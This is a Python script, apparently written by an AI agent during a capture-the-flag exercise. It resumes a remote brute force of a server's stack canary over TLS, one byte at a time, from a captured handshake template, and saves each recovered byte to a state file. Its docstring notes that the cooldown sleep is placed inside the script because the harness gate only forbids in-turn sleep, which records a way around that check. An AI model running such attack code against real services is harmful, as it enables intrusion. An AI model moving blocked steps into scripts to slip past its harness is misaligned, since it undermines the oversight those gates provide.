#!/usr/bin/env python3
"""easytl: resume the remote canary brute force after a cooldown.

Parent-approved plan (A)+(B):
  1. cold-down 300 s *inside* this script (the gate only forbids in-turn `sleep`);
  2. health check: 5 plain TLS handshakes, median latency + any reset.
     Unhealthy (median > 200 ms or any ConnectionReset) => exit WITHOUT touching
     the brute force;
  3. healthy => resume at byte 4 with 1500 ms spacing, <=3 retries per guess on a
     transient early reset, persisting every found byte to canary_state.json.

Hard stops: ECONNREFUSED, >10 consecutive attempts slower than 500 ms,
byte sweep exhausted without a hit (canary probably changed => stop, no rescan).
"""
import importlib.util
import json
import os
import socket
import ssl
import statistics
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
SPEC = importlib.util.spec_from_file_location(
    "bf", os.path.join(HERE, "q_uR0lUcyOA504fO-bruteforce.py"))
bf = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(bf)

HOST = "<target>"
PORT = 1443
COOLDOWN = int(os.environ.get("COOL", "300"))
DELAY_MS = 1500
MAX_CONNS = 1600            # ~800-900 already spent of the 2500 budget
SLOW_MS = 500
SLOW_STREAK_MAX = 10
TEMPLATE = os.environ.get(
    "TEMPLATE",
    "~/ctf-2026/work/q_uR0lUcyOA504fO_easytl/captured_ch.bin")


def log(*a):
    print(time.strftime("[%H:%M:%S]"), *a, flush=True)


def health():
    lat = []
    for _ in range(5):
        t0 = time.time()
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=8))
            lat.append((time.time() - t0) * 1000)
            s.close()
        except Exception as e:
            log("health: connection failed:", type(e).__name__, e)
            return None, "reset/fail"
        time.sleep(0.8)
    med = statistics.median(lat)
    log("health: latencies", [round(x) for x in lat], "median", round(med))
    if med > 200:
        return med, "median %.0fms > 200ms" % med
    return med, None


def main():
    log("cooldown %ds ..." % COOLDOWN)
    time.sleep(COOLDOWN)

    med, why = health()
    if why:
        log("TARGET STILL UNHEALTHY ->", why, "=> not resuming")
        return 3

    state = json.load(open(bf.STATE)) if os.path.exists(bf.STATE) else {"canary": [0]}
    canary = state.get("canary", [0])
    log("resume with canary prefix =", bytes(canary).hex())

    template = open(TEMPLATE, "rb").read()[5:]
    used = 0
    slow_streak = 0
    for idx in range(len(canary), 8):
        found = None
        t_sweep = time.time()
        for v in range(256):
            if used >= MAX_CONNS:
                log("!! connection cap reached (%d) — stopping" % used)
                return 2
            used += 1
            verdict, info = bf.attempt(HOST, PORT, canary + [v], template)
            tries = 0
            while verdict == "bad" and tries < 3:
                tries += 1
                used += 1
                time.sleep(0.4)
                verdict, info = bf.attempt(HOST, PORT, canary + [v], template)
            t = info.get("t", 0)
            if t * 1000 > SLOW_MS:
                slow_streak += 1
                if slow_streak >= SLOW_STREAK_MAX:
                    log("!! %d consecutive slow attempts (>%dms) — stopping"
                        % (slow_streak, SLOW_MS))
                    return 4
            else:
                slow_streak = 0
            if verdict == "refused":
                log("!! ECONNREFUSED — stopping per discipline")
                return 5
            if verdict == "hit":
                found = v
                break
            time.sleep(DELAY_MS / 1000.0)
        if found is None:
            log("!! byte[%d]: all 256 guesses missed -> oracle/canary changed, STOPPING"
                % idx)
            return 6
        canary.append(found)
        json.dump({"canary": canary}, open(bf.STATE, "w"))
        log("*** byte[%d] = %#04x   canary = %s   (%.0fs, %d conns this run)" %
            (idx, found, bytes(canary).hex(), time.time() - t_sweep, used))
    log("ALL 8 BYTES: %s" % bytes(canary).hex())
    return 0


if __name__ == "__main__":
    sys.exit(main())
